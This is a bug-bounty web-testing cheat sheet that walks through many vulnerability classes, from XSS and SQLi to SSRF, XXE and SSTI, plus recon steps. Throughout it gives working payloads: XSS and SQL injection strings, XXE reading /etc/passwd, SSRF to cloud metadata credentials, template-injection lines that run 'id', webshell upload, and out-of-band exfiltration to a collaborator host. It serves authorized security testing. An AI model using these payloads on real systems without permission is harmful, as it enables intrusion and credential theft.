# Bug Recon Methodology

---

## XSS (Cross-Site Scripting)

- Input ends up reflected in a DOM element like `<p>`, `<img>`, `<div>`, or inside a JS variable.
- Change input type from `email`/`number` to `text` to bypass client-side validation. Try payload: `foo@x.com"><img src=x onerror=alert(1)>`.
- Break out of HTML attributes using `">`, out of JS strings using `'`, and out of template literals using `}`.
- Check for DOM sinks: `innerHTML`, `document.write`, `eval`, `location.href`, `setTimeout(str)`.
- Stored XSS: inject into profile fields, comments, usernames — any data rendered back to other users.
- Blind XSS: use an out-of-band payload (e.g. XSS Hunter) in fields that reach admin panels or email templates.
- CSP bypass: look for `unsafe-inline`, `unsafe-eval`, whitelisted JSONP endpoints, or Angular/JSONP gadgets.

---

## SQLi (SQL Injection)

- Test with `'`, `''`, `\`, `--`, `; --` in any parameter that hits a database (search, login, ID).
- Error-based: look for DB error messages leaking table/column names.
- Boolean-based blind: `AND 1=1` (normal) vs `AND 1=2` (breaks) — different response lengths/content.
- Time-based blind: `'; WAITFOR DELAY '0:0:5'--` (MSSQL) or `AND SLEEP(5)--` (MySQL).
- Second-order SQLi: payload stored benignly, executes when retrieved in another context.
- Check ORM-based apps too — raw queries or `LIKE` clauses are often missed.

---

## IDOR (Insecure Direct Object Reference)

- Swap IDs in URLs, body params, and headers: `/api/invoice/1042` → try `1041`, `1043`.
- Look for GUIDs — they're not always random; check if they're sequential or leaked elsewhere.
- Test horizontal privilege escalation (same role, different user) and vertical (user → admin).
- Check indirect references too: filenames in params, email addresses, slugs.
- Replay another user's request with your session cookie.

---

## SSRF (Server-Side Request Forgery)

- Identify params that accept URLs or hostnames: `url=`, `redirect=`, `fetch=`, `img=`, `path=`.
- Test with `http://127.0.0.1`, `http://169.254.169.254` (AWS metadata), `http://localhost:8080`.
- Bypass filters using: `http://2130706433` (decimal IP), `http://127.1`, DNS rebinding, `http://[::1]`.
- Blind SSRF: use Burp Collaborator or interactsh to detect out-of-band HTTP/DNS callbacks.
- SSRF via file uploads: SVG with external `<image href>`, PDF with external links, XML with XXE.
- Cloud targets: try `/latest/meta-data/iam/security-credentials/` for AWS IAM keys.

---

## XXE (XML External Entity)

- Triggered anywhere XML is parsed: file upload, SOAP APIs, SVG, DOCX/XLSX imports.
- Classic read: `<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` then reference `&xxe;`.
- Blind XXE: use out-of-band with `SYSTEM "http://your-collaborator/?data=..."`.
- Error-based: trigger a parse error that leaks file content in the error message.
- Check for `Content-Type: application/xml` — try switching JSON endpoints to XML.

---

## Open Redirect

- Look for `redirect=`, `next=`, `return=`, `url=`, `goto=` parameters.
- Test with `https://attacker.com`, `//attacker.com`, `\/\/attacker.com`, `/%09/attacker.com`.
- URL-encoded and double-encoded bypasses: `%2F%2Fattacker.com`.
- Chained with OAuth: an open redirect on the auth server can leak OAuth tokens via the `redirect_uri`.

---

## CSRF (Cross-Site Request Forgery)

- Target state-changing requests: password change, email change, fund transfer, account deletion.
- Check if CSRF token is present; if not, craft a cross-origin form/fetch and test.
- Token present but not validated? Send a request with a blank or wrong token.
- SameSite cookie check: `SameSite=None` without HTTPS or missing entirely = exploitable.
- JSON-based CSRF: if endpoint accepts `text/plain`, a form with `enctype="text/plain"` can work.

---

## Broken Auth / Session Issues

- Test for predictable tokens: base64-decoded JWTs, sequential session IDs.
- JWT attacks: `alg: none`, HMAC-to-RSA confusion (sign with public key as HMAC secret), weak secret brute-force.
- Check if sessions are invalidated after logout or password change.
- Password reset: test expired/reusable tokens, host header injection in reset emails, leakage in `Referer`.
- Multi-step auth bypass: jump directly to step 3 URL without completing steps 1–2.

---

## File Upload Vulnerabilities

- Upload `.php`, `.phtml`, `.php5`, `.shtml` disguised as images by changing `Content-Type` to `image/jpeg`.
- Double extension: `shell.php.jpg` — some servers execute based on first extension.
- Check if upload destination is web-accessible; place a webshell and browse to it.
- Path traversal in filename: `../../etc/cron.d/shell`.
- SVG upload = stored XSS vector via embedded `<script>` or `<foreignObject>`.
- Large file = DoS if no size limit is enforced.

---

## CORS Misconfiguration

- Check response for `Access-Control-Allow-Origin` reflecting arbitrary `Origin` header.
- Test with `Origin: null` — some configs trust `null` (triggered by sandboxed iframes).
- If `Access-Control-Allow-Credentials: true` + reflected origin = full account takeover via JS.
- Look for wildcard (`*`) on sensitive endpoints — readable by any origin.

---

## Business Logic Flaws

- Negative quantities in cart: set `qty=-1` to subtract from total or gain credit.
- Race conditions: concurrent requests on "use once" coupons, withdrawal limits, or OTP checks.
- Step skipping: skip payment step by directly hitting the order-confirmation endpoint.
- Parameter tampering: change price, role, plan, or status fields in request body.
- Mass assignment: send extra fields (`isAdmin: true`, `role: admin`) in JSON body to registration/update endpoints.

---

## Path Traversal / LFI

- `../../etc/passwd`, `....//....//etc/passwd`, `%2e%2e%2f`, `..%252f..%252f`.
- Common in `file=`, `template=`, `page=`, `lang=`, `include=` parameters.
- LFI to RCE: log poisoning (inject PHP in User-Agent, include `/var/log/apache2/access.log`), `/proc/self/environ`.
- Check for ZIP slip in archive extraction — filenames like `../../webroot/shell.php`.

---

## Subdomain Takeover

- Find CNAMEs pointing to deprovisioned services (Heroku, GitHub Pages, Fastly, AWS S3).
- `dig CNAME target.example.com` → if it resolves to an unclaimed service, register it.
- Tools: `subjack`, `nuclei subdomain-takeover templates`.

---

## HTTP Header Injection / CRLF

- Inject `%0d%0a` (CRLF) into `Location`, `Set-Cookie`, or other reflected headers.
- Can lead to response splitting, cache poisoning, or cookie injection.
- Test in `redirect=`, `url=`, and any param echoed in response headers.

---

## GraphQL

- Introspection enabled in prod: run `__schema` query to dump full API.
- Missing auth on mutations: test `deleteUser`, `updateRole` without auth token.
- Batching attacks: send 1000 login mutations in one request to bypass rate limiting.
- Nested queries for DoS: deeply nested circular queries exhaust server resources.

---

## Rate Limiting / Enumeration

- No rate limit on login → credential stuffing; on OTP → brute-force.
- Username enumeration: different response time/message for valid vs invalid usernames.
- Verify that rate limits aren't only client-side (JS disabled or raw requests bypass).

---

## OAuth Misconfigurations

- `redirect_uri` not strictly validated: try appending paths (`/callback/../evil`), subdomains (`evil.legit.com`), or open redirects on the same domain.
- `state` parameter missing or static = CSRF on the OAuth flow → account linking hijack.
- Authorization code interception: if `redirect_uri` leaks to a third-party via `Referer`, code can be stolen.
- Token leakage in URL fragments: implicit flow sends `access_token` in the URL — check logs, `Referer` headers, browser history.
- Pre-account takeover: register with victim's email before they do via OAuth → when they link OAuth, attacker gains access.
- Scope abuse: request minimal scope, then test if the issued token actually enforces it server-side.

---

## WebSocket Attacks

- WebSocket handshake uses HTTP — test for CSRF: no `Origin` validation = cross-origin WebSocket hijack.
- Messages are not automatically protected; test for SQLi, XSS, IDOR, and command injection in WS message payloads.
- Check if auth only happens at connection time — if session expires mid-connection, does the server keep trusting the socket?
- Replay attack: capture and replay WS frames for state-changing actions (bids, trades, votes).
- Massage the protocol: send unexpected message types, malformed JSON, or oversized payloads to find crashes or logic flaws.

---

## Web Cache Poisoning

- Goal: store a malicious response in the cache that gets served to other users.
- Identify unkeyed inputs: headers like `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL` that affect the response but aren't part of the cache key.
- Inject `X-Forwarded-Host: evil.com` — if the app reflects it in a `<script src>` or `Location` header and caches the response, all users get the poisoned version.
- Cache key normalization: `/?param=1` and `/?param=1%20` may share a cache entry but be treated differently by the app.
- Fat GET: some caches key on URL only, ignoring body — send a GET with a body to poison POST-processed content.
- Combine with DOM XSS: poison a JS file import or inline script to deliver XSS at scale.

---

## API-Specific Recon

- **Endpoint discovery**: check `/api/v1/`, `/api/v2/`, `/graphql`, `/swagger.json`, `/openapi.yaml`, `/api-docs`, `/.well-known/`.
- **HTTP method abuse**: endpoint only documented for `GET`? Try `POST`, `PUT`, `DELETE`, `PATCH` — missing method checks are common.
- **Version downgrade**: `v2` endpoint has auth; try the same path on `v1` — older versions often lack security controls.
- **Mass assignment**: send undocumented fields in PUT/PATCH body; check if they get written to the DB (`role`, `verified`, `balance`).
- **Verbose errors**: send malformed JSON, wrong content types, or missing required fields — stack traces leak framework, DB type, internal paths.
- **Hidden parameters**: fuzz query params with wordlists (Arjun, param-miner) — hidden `debug=true`, `admin=1`, `internal=true` params are common.
- **JWT in APIs**: test all auth-required endpoints without a token, with an expired token, and with a token signed by `alg: none`.

---

## SSTI (Server-Side Template Injection)

- Inject template syntax in any user-controlled input that might be rendered by a template engine.
- Detection polyglot: `${{<%[%'"}}%\` — error messages reveal the engine.
- Jinja2 (Python): `{{7*7}}` → `49`; escalate to RCE with `{{''.__class__.__mro__[1].__subclasses__()}}`.
- Twig (PHP): `{{7*7}}` → `49`; RCE via `{{['id']|filter('system')}}`.
- Freemarker (Java): `${7*7}` → `49`; RCE via `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
- Common locations: email templates, PDF generators, preview features, custom report builders, error pages.

---

## Prototype Pollution

- JavaScript-specific: injecting into `__proto__` or `constructor.prototype` affects all objects in the app.
- Test: `?__proto__[foo]=bar` in query params, or `{"__proto__": {"isAdmin": true}}` in JSON body.
- Client-side: find a gadget that reads from a polluted property (e.g. `innerHTML`, `eval`, event handlers) for XSS.
- Server-side (Node.js): pollute properties used in security checks (`{"__proto__": {"authorized": true}}`); can lead to RCE via template engines or child_process calls.
- Tools: `server-side-prototype-pollution` Burp extension, manual fuzzing with `__proto__` and `constructor`.

---

## Clickjacking

- Check if `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` is missing on sensitive pages.
- Vulnerable pages: account settings, password change, fund transfer, OAuth consent screens.
- Craft an invisible iframe over a decoy UI to trick users into clicking sensitive actions.
- Bypass: some apps check `window.top === window.self` in JS — look for framebusting flaws or sandbox the iframe with `allow-scripts allow-same-origin`.

---

## HTTP Request Smuggling

- Exploits disagreement between front-end (reverse proxy) and back-end on where one request ends and another begins.
- CL.TE: front-end uses `Content-Length`, back-end uses `Transfer-Encoding: chunked`.
- TE.CL: opposite — front-end uses `Transfer-Encoding`, back-end uses `Content-Length`.
- Impact: bypass front-end security controls, poison requests of other users, cache deception, credential hijack.
- Test with Burp's HTTP Request Smuggler extension or manual timing attacks.
- Indicators: unexpected 400/500 errors, delayed responses, responses belonging to other users' requests.

---

## Insecure Deserialization

- Look for serialized objects in cookies, hidden fields, API responses: Java (`rO0AB`), PHP (`O:4:`), Python (pickle), .NET (`AAEAAAD`).
- Java: use `ysoserial` with common gadget chains (CommonsCollections, Spring, etc.) to achieve RCE.
- PHP: manipulate object properties to alter app logic (`role`, `isAdmin`); `__wakeup`/`__destruct` magic methods are RCE gadgets.
- Python pickle: `__reduce__` returns a callable — trivially leads to RCE.
- Node.js: `node-serialize` and similar libs are vulnerable to embedded IIFE payloads.
- Even without RCE: modify serialized data to escalate privileges or bypass checks.

---

## DNS / Subdomain Recon

- Passive: check crt.sh, SecurityTrails, Shodan, VirusTotal, `subfinder`, `amass` for enumerated subdomains.
- Active brute-force: use `ffuf` or `gobuster dns` with a solid wordlist (SecLists `subdomains-top1million`).
- Zone transfer (rare): `dig axfr @ns1.target.com target.com` — dumps all DNS records if misconfigured.
- Reverse DNS: `dig -x <IP>` on IP ranges owned by the target to find unlisted services.
- Look for: `dev.`, `staging.`, `admin.`, `internal.`, `vpn.`, `jenkins.`, `jira.` — often less hardened.
- ASN lookup: find all IP ranges owned by target → expand attack surface beyond just the main domain.

---

## Recon Workflow (Quick Reference)

```
1. Passive Recon       → crt.sh, Shodan, Wayback, GitHub leaks, Google dorks
2. Subdomain Enum      → subfinder + amass + brute-force → httpx to find live hosts
3. Tech Fingerprint    → Wappalyzer, whatweb, response headers, error pages
4. Content Discovery   → ffuf/gobuster on dirs + params (Arjun, param-miner)
5. Auth Surface        → map all login, register, reset, OAuth, API key flows
6. Input Points        → every param, header, cookie, file upload, WebSocket
7. Automated Scan      → Nuclei templates, Dalfox (XSS), sqlmap (SQLi)
8. Manual Testing      → business logic, chained bugs, context-specific flaws
```

---

## Host Header Injection

- The `Host` header is trusted by many apps for generating links in password reset emails, redirects, and canonical URLs.
- Replace `Host: legit.com` with `Host: evil.com` — if the reset email contains `evil.com/reset?token=...`, you capture the token.
- Cache poisoning via Host: poisoned response cached with attacker domain → all users receive malicious links.
- Bypass: try `X-Forwarded-Host`, `X-Host`, `X-Original-Host` when direct Host manipulation is blocked.
- Ambiguous host: supply two `Host` headers — some servers use the first, some the second.

---

## 2FA / MFA Bypass

- Response manipulation: server returns `{"success": false}` on wrong OTP → change to `true` and replay.
- Code reuse: test if a used OTP can be submitted again — no invalidation = replayable.
- No rate limit on OTP endpoint → brute-force 4–6 digit codes directly.
- Step skip: after completing step 1 (password), directly access the post-2FA URL without submitting OTP.
- Backup code abuse: test if backup codes are sequential, short, reusable, or exposed in API responses.
- Check if the 2FA session cookie is set before OTP verification completes — reuse it to bypass 2FA entirely.
- SMS fallback: check if "resend via SMS" can be triggered without knowing the registered number.

---

## Cookie Security Misconfigurations

- Missing `HttpOnly` → cookie readable via JS → XSS can steal session.
- Missing `Secure` → cookie sent over plain HTTP → interceptable on non-HTTPS connections.
- Missing or weak `SameSite` → CSRF exploitable (see CSRF section).
- Overly broad `Domain=.example.com` → cookie sent to all subdomains, including attacker-controlled ones.
- Long-lived session cookies with no server-side expiry → stolen cookie valid indefinitely.
- Sensitive data in cookies without encryption — base64 is not encryption.
- `remember_me` tokens: often weak, predictable, or never rotated after use.

---

## BOLA (Broken Object Level Authorization)

- REST API version of IDOR — every object (user, order, doc) must be access-controlled per request, not just per login.
- Test: authenticated as User A, request `/api/orders/{id}` using IDs from User B's account.
- Nested resources: `/api/users/123/documents/456` — swap `123` with another user's ID and check if `456` is still returned.
- Object IDs often leak in activity feeds, notifications, or unrelated API responses — harvest and test them.
- Automate: extract all IDs from one account's traffic, replay every request with a different account's token.
- Common in mobile app backends and B2B multi-tenant APIs where tenant isolation is assumed but not enforced.

---

## IDOR in Exports

- Export endpoints (CSV, PDF, Excel) often check only "are you logged in" — not "do you own these records."
- Test: trigger an export as User A, replay the exact request with User B's session cookie.
- Unsigned or predictable export URLs can be shared, guessed, or brute-forced.
- Bulk exports: `/api/export?type=invoices` with no ownership filter may return all records in the DB.
- Async exports: result stored at `/exports/{job_id}` — test job ID for IDOR across accounts.

---

## Email Header Injection

- Occurs in contact forms or any server-side feature that constructs emails from user input.
- Inject CRLF into name/email fields: `victim@x.com\r\nCC: attacker@evil.com` to add recipients.
- Add `Bcc:`, `From:`, `Reply-To:`, `Content-Type:` headers to manipulate email routing or spoof sender.
- Use cases: spam relay, phishing with spoofed sender, leaking internal email content.
- Test every field that appears in the email — subject, name, and custom fields, not just the `To:` address.

---

## Error & Stack Trace Leakage

- Trigger errors by: wrong data types, missing params, malformed JSON, oversized payloads, unexpected HTTP methods.
- Stack traces leak: framework version, runtime, internal file paths, class names, DB query structure.
- Verbose SQL errors reveal table/column names and DB engine — feeds directly into SQLi.
- Version disclosure in headers: `X-Powered-By: Express 4.17.1`, `Server: Apache/2.4.49` → check for known CVEs.
- Probe debug endpoints: `/__debug__`, `/trace`, `/actuator` (Spring Boot), `/diagnostics`, `/server-status`.

---

## Dependency / Supply Chain Recon

- Find `package.json`, `requirements.txt`, `Gemfile`, `pom.xml` in exposed repos or embedded in JS bundles.
- Run `npm audit`, `pip-audit`, `OWASP Dependency-Check` against discovered dependency lists.
- Outdated frontend libs in HTML source: old jQuery, Angular 1.x, Lodash — known XSS/prototype pollution gadgets.
- Dependency confusion: if internal package names are visible, check if a higher-versioned public package with that name exists.
- CDN-loaded scripts without SRI (`integrity` attribute) → CDN compromise = script injection for all users.
- Typosquatting: look for packages with common typo names that attackers may have published to public registries.

---

## Postman / Swagger / API Docs Exposure

- Check: `/swagger-ui.html`, `/api-docs`, `/openapi.json`, `/swagger.json`, `/v2/api-docs`, `/redoc`.
- Exposed Swagger = full endpoint list, param names, expected values, auth schemes — massive recon shortcut.
- Look for hardcoded tokens, internal service URLs, or staging environment references in the spec.
- Postman collections leaked on GitHub or in JS bundles: search `postman_environment`, `pm.environment.set`.
- Some Swagger UIs allow direct execution — test endpoints from the docs UI without a separate client.
- API docs for internal services should never be publicly accessible — unauthenticated access is itself a finding.

---

## GitHub / Git Recon

- Exposed `.git` dir: if `https://target.com/.git/HEAD` returns content, dump the full repo with `git-dumper`.
- Dumped repo contains source code, commit history, config files, and secrets that were "deleted."
- GitHub dorking: `org:targetcompany password`, `org:targetcompany api_key`, `org:targetcompany internal`.
- Commit history secret scan: `git log -p | grep -iE "api_key|secret|password|token"`.
- High-value files: `.env`, `config.php`, `database.yml`, `settings.py`, `application.properties`, `*.pem`.
- Tools: `truffleHog`, `gitleaks`, `gitrob` for automated secret scanning across repos and history.
- GitHub Actions: look for secrets printed in logs, insecure `pull_request_target` triggers, or script injection via PR titles/branch names.
